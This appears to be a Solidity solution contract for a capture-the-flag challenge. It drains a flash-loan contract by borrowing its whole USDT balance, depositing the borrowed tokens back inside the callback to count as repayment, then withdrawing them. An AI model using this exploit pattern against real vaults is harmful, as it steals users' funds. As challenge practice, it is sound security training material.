// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Chal} from "../src/Chal.sol";

contract Solve {
    Chal chal;
    uint256 amount;

    function solve(address _chal) public {
        chal = Chal(_chal);
        amount = chal.usdt().balanceOf(address(chal.flashloancontract()));
        chal.flashloancontract().flashLoan(amount, address(this), "");
        chal.flashloancontract().withdraw(amount);
        require(chal.isSolved(), "!solved");
    }

    fallback() external {
        chal.usdt().approve(address(chal.flashloancontract()), amount);
        chal.flashloancontract().deposit(amount);
    }
}
